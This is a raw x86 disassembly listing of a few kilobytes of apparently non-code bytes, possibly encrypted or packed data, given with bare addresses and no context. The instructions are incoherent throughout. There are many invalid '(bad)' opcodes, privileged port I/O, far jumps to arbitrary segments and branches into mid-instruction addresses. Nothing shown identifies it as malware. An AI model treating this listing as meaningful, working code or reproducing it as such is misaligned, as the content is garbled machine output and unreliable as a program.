  41a05a:	cli    
  41a05b:	sar    edi,0x18
  41a05e:	jg     0x41a09c
  41a060:	or     DWORD PTR [edx],esp
  41a062:	leave  
  41a063:	je     0x41a0d3
  41a065:	pop    ecx
  41a066:	mov    bh,0x66
  41a068:	dec    edx
  41a069:	mov    cl,0x4d
  41a06b:	not    BYTE PTR [ecx-0x58]
  41a06e:	and    al,0x58
  41a070:	icebp  
  41a071:	fidiv  DWORD PTR [ecx]
  41a073:	mov    WORD PTR [ecx+0x62217417],cs
  41a079:	pop    edi
  41a07a:	pop    ss
  41a07b:	mov    dl,0x75
  41a07d:	jmp    0xbbae:0x5080b7dc
  41a084:	sbb    eax,0x504f83a9
  41a089:	xchg   DWORD PTR es:[edi-0x7b],ecx
  41a08d:	jp     0x41a0b1
  41a08f:	test   DWORD PTR [edi-0x63c57a9d],ebx
  41a095:	xlat   BYTE PTR ds:[ebx]
  41a096:	pop    edi
  41a097:	aaa    
  41a098:	push   0x5e5309e5
  41a09d:	aam    0xd8
  41a09f:	push   0xfffffff6
  41a0a1:	push   edx
  41a0a2:	shr    DWORD PTR [edx+0x243c224b],cl
  41a0a8:	out    0x42,al
  41a0aa:	push   ecx
  41a0ab:	sub    esi,DWORD PTR [eax]
  41a0ad:	or     eax,0xb5acb781
  41a0b2:	sti    
  41a0b3:	sar    DWORD PTR [ebx-0x63],cl
  41a0b6:	loop   0x41a059
  41a0b8:	dec    ebp
  41a0b9:	into   
  41a0ba:	retf   0x198c
  41a0bd:	jbe    0x41a09e
  41a0bf:	ret    
  41a0c0:	add    edi,DWORD PTR [edi]
  41a0c2:	cdq    
  41a0c3:	pusha  
  41a0c4:	xlat   BYTE PTR ds:[ebx]
  41a0c5:	push   ebp
  41a0c6:	mov    dh,0xa7
  41a0c8:	mov    DWORD PTR ds:0x58dd33f2,0x5a156b60
  41a0d2:	pop    ebx
  41a0d3:	add    al,BYTE PTR [ecx+ebx*4]
  41a0d6:	mov    ah,0x4d
  41a0d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a0d9:	jns    0x41a0d7
  41a0db:	sbb    edi,DWORD PTR [eax-0x24]
  41a0de:	inc    ecx
  41a0df:	adc    DWORD PTR [edx],ecx
  41a0e1:	aaa    
  41a0e2:	iret   
  41a0e3:	xor    DWORD PTR [esi],ecx
  41a0e5:	ret    0x18e9
  41a0e8:	test   DWORD PTR [ebx-0x6f],ebp
  41a0eb:	cs push esi
  41a0ed:	iret   
  41a0ee:	push   0x3eb84e88
  41a0f3:	push   ss
  41a0f4:	inc    esp
  41a0f5:	xchg   edi,eax
  41a0f6:	imul   eax,DWORD PTR [ebx],0xffffffdd
  41a0f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a0fa:	dec    ebx
  41a0fb:	int    0x12
  41a0fd:	dec    edx
  41a0fe:	mov    esi,0xd9e14bcd
  41a103:	scas   eax,DWORD PTR es:[edi]
  41a104:	sub    BYTE PTR [eax],dh
  41a106:	(bad)  
  41a107:	cmp    dl,al
  41a109:	cwde   
  41a10a:	ret    
  41a10b:	mov    edi,0xf7f6b62a
  41a110:	xor    bl,BYTE PTR [esi]
  41a112:	jge    0x41a0ad
  41a114:	push   edx
  41a115:	xchg   BYTE PTR [eax],ch
  41a117:	enter  0x32e,0xbc
  41a11b:	and    ebx,DWORD PTR ds:0xb671fe96
  41a121:	mov    esi,0xa231e440
  41a126:	call   0x5255:0x328a689
  41a12d:	(bad)  
  41a12f:	adc    dl,dl
  41a131:	fisub  WORD PTR [edi-0xb]
  41a134:	(bad)  ds:0x115a8cf0
  41a13a:	dec    eax
  41a13b:	dec    esi
  41a13c:	cmp    esp,DWORD PTR [esi-0x12]
  41a13f:	jne    0x41a13b
  41a141:	(bad)  
  41a142:	je     0x41a160
  41a144:	mov    DWORD PTR [edx-0x498ee41e],ebx
  41a14a:	xchg   ebx,edi
  41a14c:	bound  esi,QWORD PTR [eax+0x42]
  41a14f:	outs   dx,DWORD PTR ds:[esi]
  41a150:	sbb    DWORD PTR [edi+0x11ff4dfc],edx
  41a156:	and    ecx,esp
  41a158:	and    eax,0x806ac4cd
  41a15d:	or     eax,0xdda22ccd
  41a162:	arpl   sp,ax
  41a164:	cmp    eax,0x84e08dc7
  41a169:	lods   eax,DWORD PTR ds:[esi]
  41a16a:	and    DWORD PTR [esp+eax*4+0x62629ed5],ecx
  41a171:	in     al,0xe3
  41a173:	test   ecx,esi
  41a175:	adc    eax,0xa3ab4bf5
  41a17a:	pop    edi
  41a17b:	mov    esi,0x4e463d30
  41a180:	sbb    eax,0x6f7f513c
  41a185:	out    0x1,al
  41a187:	xlat   BYTE PTR ds:[ebx]
  41a188:	xchg   DWORD PTR [eax-0x64],esp
  41a18b:	sbb    edx,esi
  41a18d:	sbb    eax,0xfd94f472
  41a192:	push   edx
  41a193:	test   edi,0x8ad00dee
  41a199:	xchg   DWORD PTR [edx+0x6d],edi
  41a19c:	lds    esp,FWORD PTR [esi-0x42f7744c]
  41a1a2:	xor    al,0x47
  41a1a4:	xor    DWORD PTR [eax+0x6],edi
  41a1a7:	jnp    0x41a1d8
  41a1a9:	pop    ebx
  41a1aa:	push   edx
  41a1ab:	stc    
  41a1ac:	push   cs
  41a1ad:	inc    edi
  41a1ae:	lock cmc 
  41a1b0:	outs   dx,BYTE PTR ds:[esi]
  41a1b1:	push   edi
  41a1b2:	and    BYTE PTR [ecx-0x6c],dh
  41a1b5:	jne    0x41a1d5
  41a1b7:	out    0xce,al
  41a1b9:	sub    al,0x3a
  41a1bb:	dec    ebp
  41a1bc:	add    edi,DWORD PTR [esi-0x4a4d8b5a]
  41a1c2:	clc    
  41a1c3:	in     al,dx
  41a1c4:	xor    esi,DWORD PTR [edx]
  41a1c6:	sub    eax,0x558d9c10
  41a1cb:	mov    DWORD PTR [edi+0x2f278602],ebx
  41a1d1:	inc    ebp
  41a1d2:	adc    ecx,DWORD PTR [edi+ecx*2]
  41a1d5:	jp     0x41a1bf
  41a1d7:	sub    BYTE PTR [ebp-0x53],0xbc
  41a1db:	mov    DWORD PTR [edi+0x45],esp
  41a1de:	outs   dx,BYTE PTR ds:[esi]
  41a1df:	int3   
  41a1e0:	mov    ecx,0x9f3febbd
  41a1e5:	mov    cl,0x0
  41a1e7:	int3   
  41a1e8:	in     eax,0x7b
  41a1ea:	lahf   
  41a1eb:	jne    0x41a25e
  41a1ed:	ins    BYTE PTR es:[edi],dx
  41a1ee:	pushf  
  41a1ef:	or     DWORD PTR [ecx],0xbe312920
  41a1f5:	scas   eax,DWORD PTR es:[edi]
  41a1f6:	stos   BYTE PTR es:[edi],al
  41a1f7:	sbb    eax,ecx
  41a1f9:	aas    
  41a1fa:	(bad)  
  41a1fb:	imul   eax,DWORD PTR [ebp+0x41c132f9],0xaf556909
  41a205:	sbb    BYTE PTR [edi-0x12556b08],dl
  41a20b:	(bad)  
  41a20c:	out    dx,al
  41a20d:	mov    ch,0x17
  41a20f:	jo     0x41a1a0
  41a211:	and    DWORD PTR [eax],ecx
  41a213:	push   cs
  41a214:	int    0x50
  41a216:	out    dx,eax
  41a217:	push   ecx
  41a218:	adc    bl,BYTE PTR ds:0x84d067f2
  41a21e:	adc    BYTE PTR [eax],al
  41a220:	adc    BYTE PTR [ebx+0x7fbaa45b],al
  41a226:	mov    al,ds:0x8c880162
  41a22b:	stos   DWORD PTR es:[edi],eax
  41a22c:	add    cl,BYTE PTR [edi+eax*4]
  41a22f:	rcr    DWORD PTR [esi+0x57cdbd71],cl
  41a235:	fucomip st,st(7)
  41a237:	sbb    DWORD PTR [ebx-0xe1f5ea7],esi
  41a23d:	enter  0xd9aa,0x39
  41a241:	retf   0x2a58
  41a244:	xor    cl,bl
  41a246:	pop    esi
  41a247:	je     0x41a295
  41a249:	mov    dl,0xf9
  41a24b:	(bad)  
  41a24d:	leave  
  41a24e:	sbb    BYTE PTR [esi],cl
  41a250:	fdiv   QWORD PTR [eax-0x76bea564]
  41a256:	retf   0xe51a
  41a259:	pop    edx
  41a25a:	packssdw mm7,QWORD PTR ds:0xcbde2477
  41a261:	das    
  41a262:	ins    BYTE PTR es:[edi],dx
  41a263:	cmp    DWORD PTR [ecx],edi
  41a265:	or     BYTE PTR [ecx+0x4ec1934],0xf8
  41a26c:	sub    BYTE PTR [edx-0x3ccb4545],bl
  41a272:	in     al,0x84
  41a274:	loop   0x41a256
  41a276:	jo     0x41a24d
  41a278:	repz or ch,BYTE PTR [ebp+edi*1-0x385e7083]
  41a280:	aad    0x6
  41a282:	aas    
  41a283:	not    DWORD PTR [ebp+0x21]
  41a286:	arpl   cx,bx
  41a288:	mov    ah,0x7e
  41a28a:	sbb    edx,DWORD PTR [ebx]
  41a28c:	(bad)  
  41a28d:	(bad)  
  41a28e:	fist   DWORD PTR [ecx+0x4b9630d2]
  41a294:	jle    0x41a267
  41a296:	mov    ecx,0x20795afb
  41a29b:	loope  0x41a291
  41a29d:	push   0xda9110a7
  41a2a2:	xchg   esp,eax
  41a2a3:	ins    BYTE PTR es:[edi],dx
  41a2a4:	fsubr  QWORD PTR [esi+0x54]
  41a2a7:	cmc    
  41a2a8:	aam    0xa6
  41a2aa:	ror    esi,cl
  41a2ac:	cs pop es
  41a2ae:	xor    BYTE PTR [ebx-0x67],ah
  41a2b1:	push   esp
  41a2b2:	std    
  41a2b3:	sub    ecx,DWORD PTR [ecx+0x47]
  41a2b6:	add    cl,0x1e
  41a2b9:	dec    ebp
  41a2ba:	mov    edi,0x5f04fc16
  41a2bf:	ss mov ch,0xfb
  41a2c2:	mov    ecx,eax
  41a2c4:	stos   DWORD PTR es:[edi],eax
  41a2c5:	and    eax,0x96e4f92b
  41a2ca:	and    BYTE PTR [esp+esi*8],al
  41a2cd:	das    
  41a2ce:	rcl    BYTE PTR [edi+0x5c],cl
  41a2d1:	cmp    al,0x8d
  41a2d3:	add    edx,DWORD PTR [ebx-0x1eeeacec]
  41a2d9:	aam    0x9b
  41a2db:	dec    edi
  41a2dc:	add    al,0x4
  41a2de:	push   esp
  41a2df:	xchg   ebp,eax
  41a2e0:	test   ecx,ecx
  41a2e2:	dec    esi
  41a2e3:	adc    dh,BYTE PTR [ecx+0x4c]
  41a2e6:	push   esi
  41a2e7:	sub    ebx,DWORD PTR [esi+eiz*4+0x4]
  41a2eb:	les    edx,FWORD PTR [bx+si]
  41a2ee:	xlat   BYTE PTR ds:[ebx]
  41a2ef:	xchg   esi,eax
  41a2f0:	xchg   ecx,eax
  41a2f1:	xor    al,bh
  41a2f3:	(bad)  
  41a2f4:	mov    dl,0x5d
  41a2f6:	popf   
  41a2f7:	or     BYTE PTR [esp+eax*1+0x41],ch
  41a2fb:	lods   eax,DWORD PTR ds:[esi]
  41a2fc:	inc    edx
  41a2fd:	not    bl
  41a2ff:	lods   eax,DWORD PTR ds:[esi]
  41a300:	cmp    al,0xbd
  41a302:	jge    0x41a342
  41a304:	xlat   BYTE PTR ds:[ebx]
  41a305:	pop    esi
  41a306:	adc    al,0x9c
  41a308:	mov    esi,0xbb44af8c
  41a30d:	pop    es
  41a30e:	dec    edx
  41a30f:	inc    ebx
  41a310:	xlat   BYTE PTR es:[ebx]
  41a312:	mov    al,0x47
  41a314:	adc    BYTE PTR [esi],ch
  41a316:	push   esp
  41a317:	adc    ebx,DWORD PTR [esi+0x3e]
  41a31a:	shrd   DWORD PTR [ebp-0x5ec07a51],ebp,0x14
  41a322:	(bad)  
  41a323:	jge    0x41a2df
  41a325:	push   es
  41a326:	add    ch,dh
  41a328:	(bad)  
  41a329:	cwde   
  41a32a:	icebp  
  41a32b:	das    
  41a32c:	dec    ebx
  41a32d:	xchg   ebp,eax
  41a32e:	fwait
  41a32f:	inc    edx
  41a330:	lahf   
  41a331:	push   0x65f6f810
  41a336:	in     al,dx
  41a337:	mov    ds:0x15c084c,al
  41a33c:	mov    al,0x65
  41a33f:	adc    DWORD PTR [esp+edi*2],eax
  41a342:	add    BYTE PTR [edi],ah
  41a344:	out    dx,eax
  41a345:	fld    DWORD PTR [edx]
  41a347:	and    BYTE PTR ds:0xe6a71db9,dl
  41a34d:	inc    ebx
  41a34e:	call   0x5ccdef70
  41a353:	aas    
  41a354:	(bad)  
  41a355:	and    ebx,DWORD PTR [edx-0x22]
  41a358:	adc    DWORD PTR [edx-0x72525765],eax
  41a35e:	stc    
  41a35f:	mov    esi,0x129920f5
  41a364:	xor    ecx,0xf46363b9
  41a36a:	xlat   BYTE PTR ds:[ebx]
  41a36b:	das    
  41a36c:	pop    esp
  41a36d:	in     eax,dx
  41a36e:	outs   dx,DWORD PTR cs:[esi]
  41a370:	sahf   
  41a371:	cmp    eax,0x4f98827
  41a376:	ret    0xb4d5
  41a379:	aam    0x1a
  41a37b:	dec    ecx
  41a37c:	sub    ch,BYTE PTR [esi+0x2a]
  41a37f:	jo     0x41a334
  41a381:	adc    al,0xaf
  41a383:	pushf  
  41a384:	xor    edi,ecx
  41a386:	test   BYTE PTR [ecx-0x3168d078],bh
  41a38c:	(bad)  
  41a38e:	fldcw  WORD PTR ds:0x612ec707
  41a394:	pop    esi
  41a395:	sar    BYTE PTR [ebp-0x15],cl
  41a398:	xor    cl,al
  41a39a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a39b:	sub    BYTE PTR [eax+0x49f4e1b9],bl
  41a3a1:	sti    
  41a3a2:	mov    edi,0x948a6ca8
  41a3a7:	jmp    0x7ed8:0xa6fed9cc
  41a3ae:	push   esi
  41a3af:	jne    0x41a385
  41a3b1:	loop   0x41a338
  41a3b3:	aad    0x61
  41a3b5:	inc    ecx
  41a3b6:	stc    
  41a3b7:	(bad)  
  41a3b9:	mov    ebx,0x18cbda4c
  41a3be:	(bad)  
  41a3c1:	int    0x1e
  41a3c3:	mov    ah,0xb4
  41a3c5:	mov    BYTE PTR [edi-0x53],bl
  41a3c8:	adc    al,0xb7
  41a3ca:	out    dx,al
  41a3cb:	mov    eax,ds:0xac977c50
  41a3d0:	inc    edx
  41a3d1:	cdq    
  41a3d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a3d3:	fdiv   st,st(3)
  41a3d5:	loop   0x41a381
  41a3d7:	into   
  41a3d8:	adc    esi,edx
  41a3da:	mov    ds:0x9e1f6c9e,eax
  41a3df:	xchg   ebp,eax
  41a3e0:	sub    eax,0xcc5f40e3
  41a3e5:	cwde   
  41a3e6:	inc    ebx
  41a3e7:	sbb    ecx,DWORD PTR [eax]
  41a3e9:	out    0xc,eax
  41a3eb:	jle    0x41a453
  41a3ed:	push   cs
  41a3ee:	loope  0x41a446
  41a3f0:	mov    ecx,0xe5448f51
  41a3f5:	mov    ebp,0xefefc5f0
  41a3fa:	lods   eax,DWORD PTR ds:[esi]
  41a3fb:	(bad)  
  41a3fc:	in     eax,dx
  41a3fd:	sbb    al,0x43
  41a3ff:	add    dl,BYTE PTR [eax-0x528e75f8]
  41a405:	add    DWORD PTR [edi+0x54],ecx
  41a408:	je     0x41a451
  41a40a:	arpl   sp,bp
  41a40c:	test   eax,0xa8623aa2
  41a412:	xchg   ebx,eax
  41a413:	sub    bl,BYTE PTR ds:0x710bce4c
  41a419:	das    
  41a41a:	add    eax,0x653138f0
  41a41f:	std    
  41a420:	xor    eax,0x3946d668
  41a425:	sub    eax,0xdac1d286
  41a42a:	jb     0x41a40e
  41a42c:	cmp    ecx,ecx
  41a42e:	sahf   
  41a42f:	fdivr  QWORD PTR [ebx+eax*8+0x0]
  41a433:	push   esp
  41a434:	outs   dx,DWORD PTR ds:[esi]
  41a435:	pushf  
  41a436:	repz cmp al,0x26
  41a439:	imul   ecx,DWORD PTR [ebx+0x58],0x55a5e881
  41a440:	pushf  
  41a441:	in     eax,0xa5
  41a443:	xor    cl,BYTE PTR [ecx]
  41a445:	repz arpl WORD PTR [edi],di
  41a448:	data16 loope 0x41a468
  41a44b:	cmp    esi,DWORD PTR [ebp-0x5e]
  41a44e:	lea    esp,[ebp+0x61]
  41a451:	mov    ds:0x9c050b76,al
  41a456:	fsub   QWORD PTR [ecx-0x55]
  41a459:	jo     0x41a3e2
  41a45b:	push   cs
  41a45c:	clc    
  41a45d:	pushw  cs
  41a45f:	pop    ebp
  41a460:	or     DWORD PTR [ebp-0x7f0f2b16],edx
  41a466:	xchg   DWORD PTR [ecx-0xa],edi
  41a469:	mov    ebx,0x949c8d61
  41a46e:	add    BYTE PTR [edx-0x23759ace],ch
  41a474:	push   esp
  41a475:	adc    BYTE PTR [edi+0x42],al
  41a478:	add    DWORD PTR [ebp-0x80],eax
  41a47b:	in     al,dx
  41a47c:	pop    ds
  41a47d:	or     eax,0xf09b11ae
  41a482:	or     DWORD PTR [ebx+0x65],esi
  41a485:	mov    cl,0xcf
  41a487:	adc    eax,0xb020dd76
  41a48c:	dec    ebx
  41a48d:	aad    0x90
  41a48f:	cdq    
  41a490:	adc    DWORD PTR [edi+eax*4+0x73],edx
  41a494:	mov    esi,0x1904070a
  41a499:	cmp    eax,0xf1fe7f23
  41a49e:	dec    eax
  41a49f:	mov    eax,DWORD PTR [ebp*2-0x7412c1f1]
  41a4a6:	aam    0xfc
  41a4a8:	sbb    ah,BYTE PTR [ecx+0x5d]
  41a4ab:	repnz fwait
  41a4ad:	push   ebp
  41a4ae:	jo     0x41a4d0
  41a4b0:	jle    0x41a48c
  41a4b2:	xor    ah,BYTE PTR [edx+0x1a]
  41a4b5:	mov    al,ds:0xc70db3ff
  41a4ba:	xor    bl,BYTE PTR [ebx+0x7d]
  41a4bd:	ins    BYTE PTR es:[edi],dx
  41a4be:	cmp    ebp,ecx
  41a4c0:	or     cl,bh
  41a4c2:	cmp    edi,ebx
  41a4c4:	mov    ch,0x43
  41a4c6:	(bad)  
  41a4c7:	(bad)  
  41a4c8:	std    
  41a4c9:	sbb    DWORD PTR [eax-0x14],0x1bb661aa
  41a4d0:	jp     0x41a456
  41a4d2:	stos   DWORD PTR es:[edi],eax
  41a4d3:	dec    ecx
  41a4d4:	stos   BYTE PTR es:[edi],al
  41a4d5:	xchg   ebx,eax
  41a4d6:	sbb    ebp,DWORD PTR [ecx-0x2b8e4a86]
  41a4dc:	cmp    bh,ah
  41a4de:	jns    0x41a4db
  41a4e0:	scas   eax,DWORD PTR es:[edi]
  41a4e1:	ffree  st(0)
  41a4e3:	jecxz  0x41a4f4
  41a4e5:	cs cmp al,0x56
  41a4e8:	mov    ds:0xc823c795,al
  41a4ed:	push   ecx
  41a4ee:	daa    
  41a4ef:	cwde   
  41a4f0:	pushf  
  41a4f1:	loope  0x41a513
  41a4f3:	mov    esp,0xa2c15dd5
  41a4f8:	test   DWORD PTR [ebx-0x18075079],0x986bf849
  41a502:	fs mov esi,0xea933678
  41a508:	pop    eax
  41a509:	pop    esp
  41a50a:	xor    ebx,DWORD PTR [edx]
  41a50c:	pop    eax
  41a50d:	repz inc eax
  41a50f:	jmp    0x55d589e3
  41a514:	jae    0x41a4a8
  41a516:	cdq    
  41a517:	jb     0x41a499
  41a519:	jae    0x41a54f
  41a51b:	inc    edi
  41a51c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a51d:	into   
  41a51e:	dec    ebp
  41a51f:	pop    es
  41a520:	adc    ebx,DWORD PTR [esp+edx*8]
  41a523:	xchg   ebx,eax
  41a524:	jb     0x41a4e0
  41a526:	and    ecx,eax
  41a528:	cld    
  41a529:	mov    eax,ds:0xc1d03bfe
  41a52e:	shl    DWORD PTR [edi+0x22fe2b7b],1
  41a534:	xchg   esp,eax
  41a535:	add    eax,0x4adc977d
  41a53a:	mov    ecx,0x43b7f4a4
  41a53f:	or     ebx,ecx
  41a541:	mov    bh,0xfd
  41a543:	xor    al,0xbe
  41a545:	ss push 0xffffffa3
  41a548:	lea    ebp,[ebp-0x384b99ec]
  41a54e:	xor    al,0x31
  41a550:	jecxz  0x41a5b5
  41a552:	sahf   
  41a553:	cmp    edx,ebx
  41a555:	sub    ebp,DWORD PTR [ebx+edx*8-0x34f4cd4b]
  41a55c:	add    eax,0x49639240
  41a561:	(bad)  
  41a562:	scas   eax,DWORD PTR es:[edi]
  41a563:	pop    ecx
  41a564:	inc    ebx
  41a565:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a566:	mov    eax,0x7bb35067
  41a56b:	stos   DWORD PTR es:[edi],eax
  41a56c:	push   edi
  41a56d:	cli    
  41a56e:	add    eax,0x35be8872
  41a573:	es jns 0x41a50c
  41a576:	sub    eax,DWORD PTR [esi-0x15e5da3a]
  41a57c:	mov    al,ds:0xa9db03f4
  41a581:	cmc    
  41a582:	test   DWORD PTR [ebp+0x34337594],0x2e941d08
  41a58c:	mov    DWORD PTR [ecx],esi
  41a58e:	mov    edx,0x8e95cbf2
  41a593:	retf   
  41a594:	xor    eax,0xcb539f20
  41a599:	cmp    ch,dl
  41a59b:	enter  0x6492,0xb
  41a59f:	adc    edi,DWORD PTR [ebp+0x532c9ada]
  41a5a5:	adc    DWORD PTR es:[esi+0x78466ed8],eax
  41a5ac:	sub    al,0xb6
  41a5ae:	retf   
  41a5af:	xor    DWORD PTR [ecx-0x12],ebx
  41a5b2:	stos   DWORD PTR es:[edi],eax
  41a5b3:	xchg   ebx,eax
  41a5b4:	rcl    DWORD PTR [ebx+eax*2-0x21],cl
  41a5b8:	xchg   edi,eax
  41a5b9:	fs mov ebx,ecx
  41a5bc:	adc    bl,bl
  41a5be:	push   edx
  41a5bf:	cmp    bh,cl
  41a5c1:	dec    edi
  41a5c2:	ret    
  41a5c3:	mov    ss,WORD PTR [edi+eax*4]
  41a5c6:	fisub  WORD PTR [edi+0x53de63b1]
  41a5cc:	and    al,0x2c
  41a5ce:	cwde   
  41a5cf:	daa    
  41a5d0:	clc    
  41a5d1:	mov    DWORD PTR [edx-0x24c44cf1],0xaeccf429
  41a5db:	fcomp  DWORD PTR [ebx-0x4f]
  41a5de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a5df:	jo     0x41a5ea
  41a5e1:	(bad)  
  41a5e2:	jge    0x41a58f
  41a5e4:	push   cs
  41a5e5:	ror    bh,cl
  41a5e7:	ss push ebp
  41a5e9:	out    0x28,eax
  41a5eb:	repnz cmp DWORD PTR [edi+0x4a55a443],edx
  41a5f2:	sub    al,0x9b
  41a5f4:	sub    DWORD PTR [edi+0x2f],ebx
  41a5f7:	cmp    DWORD PTR [ebx-0x7ce35239],edi
  41a5fd:	test   BYTE PTR [esi+edi*4+0x23],bl
  41a601:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a602:	retf   0x9a4e
  41a605:	popa   
  41a606:	je     0x41a5e6
  41a608:	dec    esp
  41a60a:	cld    
  41a60b:	mov    eax,0x9e230854
  41a610:	sub    edx,DWORD PTR [ecx]
  41a612:	and    DWORD PTR [edi+0x58],ecx
  41a615:	inc    ebp
  41a616:	pop    esp
  41a617:	inc    edi
  41a618:	lea    esi,[esi+0x4b]
  41a61b:	cmp    edx,DWORD PTR [esi]
  41a61d:	push   edx
  41a61e:	xor    al,0xc2
  41a620:	sbb    bh,BYTE PTR [edi+edx*8]
  41a623:	in     al,dx
  41a624:	pop    edx
  41a625:	and    DWORD PTR [edi-0x764c80b9],ebx
  41a62b:	mov    edx,0xae62187d
  41a630:	inc    ch
  41a632:	fwait
  41a633:	(bad)  
  41a634:	pop    eax
  41a635:	add    BYTE PTR [ecx-0x2563f7ab],dl
  41a63b:	push   0xffffff84
  41a63d:	push   0xe
  41a63f:	adc    DWORD PTR [eax+eiz*4-0x1e4357b2],edx
  41a646:	pop    ebx
  41a647:	sbb    DWORD PTR [ebp+0x7c75b5c6],edx
  41a64d:	xchg   ebx,eax
  41a64e:	sub    BYTE PTR [eax],0xfa
  41a651:	(bad)  
  41a652:	js     0x41a5f2
  41a654:	push   edx
  41a655:	test   eax,0xeaead017
  41a65a:	mov    ds,esp
  41a65c:	sti    
  41a65d:	leave  
  41a65e:	or     eax,0x503c267d
  41a663:	jnp    0x41a6c8
  41a665:	(bad)  
  41a667:	mov    ecx,0xa90116f
  41a66c:	inc    ebp
  41a66d:	out    0x8c,eax
  41a66f:	test   al,0xb9
  41a671:	mov    edi,0x4349c591
  41a676:	cwde   
  41a677:	jb     0x41a6bf
  41a679:	xor    al,0xde
  41a67b:	mov    ds:0xdda1b499,eax
  41a680:	addr16 inc ebp
  41a682:	push   esp
  41a683:	push   0xffffffc5
  41a685:	xchg   DWORD PTR [ebx-0xf],esp
  41a688:	sahf   
  41a689:	mov    cl,BYTE PTR [esi]
  41a68b:	cdq    
  41a68c:	mov    al,BYTE PTR [edx+edx*2-0x35]
  41a690:	aaa    
  41a691:	or     ebx,edx
  41a693:	test   BYTE PTR ds:0xf16cac91,0x4f
  41a69a:	dec    eax
  41a69b:	(bad)  [esp+edx*8-0x21]
  41a69f:	stc    
  41a6a0:	dec    ebp
  41a6a1:	or     al,0x38
  41a6a3:	sbb    eax,0xa2def49f
  41a6a8:	test   ebp,eax
  41a6aa:	jns    0x41a722
  41a6ac:	sbb    esp,DWORD PTR [ebp-0x5b]
  41a6af:	sbb    BYTE PTR [edi-0x42d67299],bh
  41a6b5:	test   BYTE PTR [eax],ah
  41a6b7:	and    edi,0x9287bf81
  41a6bd:	mov    edi,ebp
  41a6bf:	stc    
  41a6c0:	imul   eax,DWORD PTR [edi-0x2bf2884d],0x49571abf
  41a6ca:	fisub  WORD PTR [ebp+0x25]
  41a6cd:	aad    0x65
  41a6cf:	and    esi,DWORD PTR [ebx-0x1617c0f5]
  41a6d5:	xchg   ecx,eax
  41a6d6:	wbinvd 
  41a6d8:	sub    DWORD PTR [ebx-0x4aa4cafe],ebp
  41a6de:	mov    ds:0xb773e937,al
  41a6e3:	mov    eax,0x96c175fd
  41a6e8:	js     0x41a697
  41a6ea:	pop    edx
  41a6eb:	sub    DWORD PTR [ebx-0x621a46ac],0xffffff87
  41a6f2:	push   ecx
  41a6f3:	mov    ss,esi
  41a6f5:	cmp    eax,0x6b48ba4a
  41a6fa:	(bad)  
  41a6fb:	xlat   BYTE PTR ds:[ebx]
  41a6fc:	adc    al,0xb0
  41a6fe:	push   0xb2840ec0
  41a703:	aas    
  41a704:	popa   
  41a705:	push   cs
  41a706:	dec    edi
  41a707:	adc    DWORD PTR [esi+0x5cf65eee],0x14
  41a70e:	push   eax
  41a70f:	out    0xac,eax
  41a711:	idiv   BYTE PTR [ebx-0x1c4a9a5e]
  41a717:	fcomp  st(2)
  41a719:	test   al,0x80
  41a71b:	jge    0x41a73a
  41a71d:	inc    edx
  41a71e:	sub    dh,BYTE PTR [eax]
  41a720:	cli    
  41a721:	sbb    eax,0xfd07b7ba
  41a726:	or     bh,BYTE PTR [edx]
  41a728:	data16 jbe 0x41a713
  41a72b:	xor    dh,BYTE PTR [edi+0x43]
  41a72e:	std    
  41a72f:	rcr    BYTE PTR [eax+ebp*1],0x92
  41a733:	adc    eax,DWORD PTR [ecx-0x67]
  41a736:	mov    ch,0xb3
  41a738:	das    
  41a739:	pop    ss
  41a73a:	xchg   ecx,eax
  41a73b:	fist   DWORD PTR [ebx+0x32]
  41a73e:	ret    
  41a73f:	aam    0xa9
  41a741:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a742:	in     al,0x52
  41a744:	pop    esp
  41a745:	das    
  41a746:	in     eax,dx
  41a747:	(bad)  
  41a748:	sar    DWORD PTR [ebp-0x22],0x91
  41a74c:	mov    ebx,ecx
  41a74e:	xor    bl,BYTE PTR [edi+0x35]
  41a751:	xchg   BYTE PTR [edi],bh
  41a753:	clc    
  41a754:	ror    DWORD PTR [edx-0x3fc27392],0x60
  41a75b:	ss pop ebx
  41a75d:	pop    edi
  41a75e:	sub    edx,DWORD PTR [ebx+0x28fee8fb]
  41a764:	xor    DWORD PTR [esi+0x57383b18],edx
  41a76a:	add    DWORD PTR [edx],esi
  41a76c:	mov    ecx,0x9668865e
  41a771:	jmp    0x67ca59b9
  41a776:	in     eax,0x88
  41a778:	(bad)  
  41a77a:	loopne 0x41a72f
  41a77c:	inc    ebp
  41a77d:	lea    edi,[edx]
  41a77f:	dec    esp
  41a780:	addr16 sbb al,0x76
  41a783:	mov    ebp,DWORD PTR [edx-0x67]
  41a786:	xchg   DWORD PTR [eax],edi
  41a788:	in     al,dx
  41a789:	out    dx,al
  41a78a:	and    ebx,ecx
  41a78c:	pop    ss
  41a78d:	sub    ebp,edi
  41a78f:	test   BYTE PTR [ebx+ebp*4-0x11],cl
  41a793:	mov    bh,0xeb
  41a795:	jmp    0x41a77a
  41a797:	mov    ds:0x45665605,eax
  41a79c:	jno    0x41a81c
  41a79e:	sub    dl,BYTE PTR [edx]
  41a7a0:	mov    ebp,0x72eaf2e1
  41a7a5:	sub    dh,dl
  41a7a7:	adc    al,0xc2
  41a7a9:	fisub  DWORD PTR [esi-0x25d635ed]
  41a7af:	in     al,0x9d
  41a7b1:	sbb    eax,0x53ef0055
  41a7b6:	or     bl,BYTE PTR [eax]
  41a7b8:	mov    ch,0x62
  41a7ba:	sar    BYTE PTR [edi-0x20],0x7a
  41a7be:	loope  0x41a791
  41a7c0:	add    al,0xe4
  41a7c2:	lods   eax,DWORD PTR ds:[esi]
  41a7c3:	addr16 fst st(0)
  41a7c6:	push   ebp
  41a7c7:	lods   eax,DWORD PTR ds:[esi]
  41a7c8:	aaa    
  41a7c9:	out    0x7d,eax
  41a7cb:	test   al,0xd2
  41a7cd:	shl    DWORD PTR [esi-0x2fd14cf4],1
  41a7d3:	rol    DWORD PTR [ebx-0x4e4acfbd],cl
  41a7d9:	fchs   
  41a7db:	call   0xff65f34b
  41a7e0:	mov    eax,ds:0x263d3dde
  41a7e5:	cdq    
  41a7e6:	jmp    0x91c716d3
